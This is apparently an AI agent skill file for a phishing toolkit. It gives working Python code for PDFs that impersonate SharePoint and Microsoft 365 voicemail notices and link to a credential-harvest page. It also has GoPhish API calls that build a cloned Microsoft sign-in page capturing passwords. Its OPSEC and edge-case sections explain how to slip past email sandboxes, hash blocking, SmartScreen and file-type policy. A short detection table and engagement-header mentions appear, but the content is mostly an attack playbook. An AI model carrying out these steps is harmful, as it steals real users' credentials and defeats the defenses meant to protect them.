---
name: pdf-credential-harvest
description: "Weaponized PDF attachments that redirect victims to fake authentication portals (SharePoint, M365, Google Workspace) — no exploit, no macro, just a convincing document with embedded links to a credential-capture page."
allowed-tools: Bash Read Write
metadata:
  subdomain: phishing
  when_to_use: "pdf phishing credential harvest sharepoint m365 google workspace fake login portal attachment lure fpdf reportlab pdf link"
  mitre_attack:
    - T1566.001
    - T1204.002
    - T1598.003
  tags:
    - phishing
    - pdf
    - credential-harvest
    - sharepoint
    - m365
---

# PDF Credential Harvest

A weaponised PDF requires no exploit and no macro — it is a
pixel-perfect document themed as a SharePoint sharing notification,
Microsoft 365 voicemail, or similar business pretext. The PDF contains
an embedded link (button or full-page overlay) pointing at a
credential-capture landing page. Because the PDF itself is benign
(no JavaScript, no embedded files), it passes most sandbox detonation.

## Prerequisites

- Python `fpdf2` or `reportlab` in the sandbox.
- GoPhish campaign infrastructure configured (`gophish-campaign`).
- A credential-harvest landing page on a `lookalike-domain`.
- Microsoft-branded assets (logo SVG/PNG) for template fidelity.
- The `lure-deconfliction` handshake COMPLETE.

## Quick Reference

```bash
# Generate a SharePoint-themed PDF with harvest link
python3 /workspace/gen_pdf_lure.py \
  --template sharepoint \
  --url "https://login.<LURE_DOMAIN>/auth?id={{.RId}}" \
  --output /workspace/SharedDocument.pdf

# Strip metadata
exiftool -all= /workspace/SharedDocument.pdf

# Upload to GoPhish as email attachment
curl -sk -H "Authorization: Bearer $GOPHISH_API_KEY" \
  -H 'Content-Type: application/json' \
  "$GOPHISH_API/templates/" -d @/workspace/template_with_pdf.json
```

## MITRE ATT&CK Mapping

| Technique | ID | Usage |
|---|---|---|
| Phishing: Spearphishing Attachment | T1566.001 | PDF delivered as email attachment |
| User Execution: Malicious File | T1204.002 | Victim opens PDF and clicks embedded link |
| Phishing for Information: Spearphishing Link | T1598.003 | Link leads to credential-capture portal |

## 1. SharePoint-Themed PDF

Mimics the "Someone shared a document with you" SharePoint notification:

```python
from fpdf import FPDF

class SharePointPDF(FPDF):
    def header(self):
        self.set_fill_color(0, 120, 212)  # Microsoft blue
        self.rect(0, 0, 210, 45, 'F')
        self.set_font("Helvetica", "B", 18)
        self.set_text_color(255, 255, 255)
        self.set_y(12)
        self.cell(0, 10, "SharePoint", align="C")

HARVEST = "https://login.<LURE_DOMAIN>/auth?id=<TRACKING_ID>"

pdf = SharePointPDF()
pdf.add_page()
pdf.set_y(55)
pdf.set_text_color(0, 0, 0)
pdf.set_font("Helvetica", "B", 14)
pdf.cell(0, 10, "<SENDER_NAME> shared a file with you", ln=True, align="C")
pdf.ln(5)
pdf.set_font("Helvetica", "", 11)
pdf.multi_cell(0, 6,
    "You have received a secure document via SharePoint Online. "
    "Click the button below to view the document. You may be asked "
    "to verify your identity.")
pdf.ln(10)

# Clickable button
pdf.set_fill_color(0, 120, 212)
pdf.set_text_color(255, 255, 255)
pdf.set_font("Helvetica", "B", 13)
bw, bh = 70, 12
bx = (210 - bw) / 2
pdf.set_xy(bx, pdf.get_y())
pdf.cell(bw, bh, "Open Document", align="C", fill=True, link=HARVEST)

pdf.ln(20)
pdf.set_text_color(120, 120, 120)
pdf.set_font("Helvetica", "I", 8)
pdf.cell(0, 5, "Microsoft Corporation - One Microsoft Way, Redmond, WA", align="C")
pdf.output("/workspace/SharedDocument.pdf")
```

## 2. M365 Voicemail-Themed PDF

Mimics a Microsoft 365 voicemail notification — high urgency, short
content, single "Play Voicemail" button:

```python
from fpdf import FPDF

HARVEST = "https://login.<LURE_DOMAIN>/auth?id=<TRACKING_ID>"

pdf = FPDF()
pdf.add_page()
pdf.set_fill_color(243, 242, 241)
pdf.rect(0, 0, 210, 297, 'F')

pdf.set_y(40)
pdf.set_font("Helvetica", "B", 16)
pdf.set_text_color(50, 50, 50)
pdf.cell(0, 10, "You have a new voicemail", ln=True, align="C")
pdf.ln(4)
pdf.set_font("Helvetica", "", 11)
pdf.set_text_color(80, 80, 80)
pdf.cell(0, 7, "From: <CALLER_NUMBER>", ln=True, align="C")
pdf.cell(0, 7, "Duration: 0:47", ln=True, align="C")
pdf.cell(0, 7, "Received: <DATE_TIME>", ln=True, align="C")
pdf.ln(12)

pdf.set_fill_color(0, 120, 212)
pdf.set_text_color(255, 255, 255)
pdf.set_font("Helvetica", "B", 13)
bw, bh = 60, 12
pdf.set_x((210 - bw) / 2)
pdf.cell(bw, bh, "Play Voicemail", align="C", fill=True, link=HARVEST)

pdf.output("/workspace/Voicemail.pdf")
```

## 3. Full-Page Click Overlay

Make the entire PDF page a single clickable link so any click anywhere
opens the harvest URL — no button needed, just a page-sized annotation:

```python
from fpdf import FPDF

HARVEST = "https://login.<LURE_DOMAIN>/auth?id=<TRACKING_ID>"

pdf = FPDF()
pdf.add_page()
# Render the visual content (logo, text, etc.)
pdf.set_font("Helvetica", "", 12)
pdf.cell(0, 10, "Loading secure document...", align="C")
# Full-page link annotation
pdf.link(0, 0, 210, 297, HARVEST)
pdf.output("/workspace/FullPageLure.pdf")
```

## 4. Credential-Capture Landing Page

The harvest page clones the target's SSO portal. Configure in GoPhish:

```bash
API="https://127.0.0.1:3333/api"
H="Authorization: Bearer $GOPHISH_API_KEY"

# M365-themed landing page
curl -sk -H "$H" -H 'Content-Type: application/json' "$API/pages/" -d '{
  "name": "m365-login",
  "html": "<!DOCTYPE html><html><head><title>Sign in - Microsoft</title><style>body{font-family:Segoe UI,sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;background:#f2f2f2}form{background:#fff;padding:44px;width:440px;box-shadow:0 2px 6px rgba(0,0,0,.2)}</style></head><body><form method=POST><img src=\"https://logincdn.msftauth.net/shared/1.0/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg\" width=108/><h2 style=\"font-weight:600\">Sign in</h2><input name=email style=\"width:100%;padding:8px;margin:8px 0;border:1px solid #666\" placeholder=\"Email, phone, or Skype\"/><input name=password type=password style=\"width:100%;padding:8px;margin:8px 0;border:1px solid #666\" placeholder=\"Password\"/><button style=\"width:100%;padding:10px;background:#0067b8;color:#fff;border:none;cursor:pointer\">Sign in</button></form></body></html>",
  "capture_credentials": true,
  "capture_passwords": true,
  "redirect_url": "https://login.microsoftonline.com"
}'
```

## 5. GoPhish Email Template with PDF Attachment

```bash
# Create template referencing the PDF attachment
curl -sk -H "$H" -H 'Content-Type: application/json' "$API/templates/" -d '{
  "name": "sharepoint-share",
  "subject": "<SENDER_NAME> shared \"Q3 Report\" with you",
  "html": "<p>Hi {{.FirstName}},</p><p>Please review the attached document.</p><p style=\"color:#999;font-size:10px\">Microsoft SharePoint Online {{.Tracker}}</p>",
  "attachments": [{
    "name": "SharedDocument.pdf",
    "content": "<BASE64_PDF_CONTENT>",
    "type": "application/pdf"
  }]
}'
```

## OPSEC

- **Strip PDF metadata** before delivery:
  `exiftool -all= -overwrite_original /workspace/*.pdf`
- **No JavaScript in the PDF** — JS triggers sandbox detonation in
  Proofpoint / Mimecast / Defender. Links-only PDFs pass.
- **Randomize PDF structure**: vary object order, producer string, and
  creation dates across waves to avoid hash-based blocking.
- **File name**: match the pretext (e.g., `SharedDocument.pdf`,
  `Voicemail_<DATE>.pdf`). Avoid `payload.pdf`.
- Send rate matches `opsec_level` (stealth ≤2/h, standard ≤20/h).
- Every template carries the engagement header + opt-out link.

## Tools & Resources

| Tool | Purpose |
|---|---|
| `fpdf2` (Python) | PDF generation with clickable link annotations |
| `reportlab` (Python) | Advanced PDF generation with richer layout |
| GoPhish | Campaign delivery, tracking, credential capture |
| `exiftool` | Metadata stripping before delivery |
| `wkhtmltopdf` | HTML-to-PDF conversion for complex templates |

## Detection Signatures

| Detection | Source | Description |
|---|---|---|
| PDF with external URI annotation | Email gateway | PDF link objects pointing at non-corporate domains |
| Credential submission from phish page | GoPhish / proxy logs | POST to harvest domain with username + password |
| Unusual PDF attachment from external sender | Mail flow rules | PDFs from first-time senders with link annotations |
| Browser navigation to lookalike domain | Proxy / DNS logs | Domain not in corporate allow-list |

## Error Handling & Edge Cases

- **PDF renders blank in webmail preview**: some webmail clients
  (OWA, Gmail) render PDFs inline without honouring link annotations.
  Mitigation: add visible "Click here" text with underline styling.
- **Harvest domain flagged by SmartScreen**: rotate to a backup domain
  or use a redirector chain (`lookalike → redirector → harvest`).
- **PDF blocked by file-type policy**: rename extension to `.PDF`
  (case variation) or deliver inside a ZIP. Check target's mail policy.
- **reportlab vs fpdf2**: `reportlab` supports more advanced layout
  (tables, SVG embedding) but is heavier. Use `fpdf2` for simple
  single-page lures.

## Decision Gate

```
IF target email gateway detonates PDF link annotations
  → use full-page click overlay (harder for sandbox to detect link area)
  → OR deliver PDF inside password-protected ZIP
ELIF target org uses SharePoint heavily
  → use SharePoint-themed template
ELIF voicemail pretext matches target culture
  → use M365 voicemail template
ELIF target uses Google Workspace
  → adapt template to Google Drive sharing theme
ELSE
  → generic "secure document" theme with corporate branding
```

## Evidence

Captured credentials → `Credential` node linked to the `User` node
with the GoPhish tracking id. Save the PDF template hash and GoPhish
results under `evidence/phisher/<campaign>-pdf-harvest.json`.
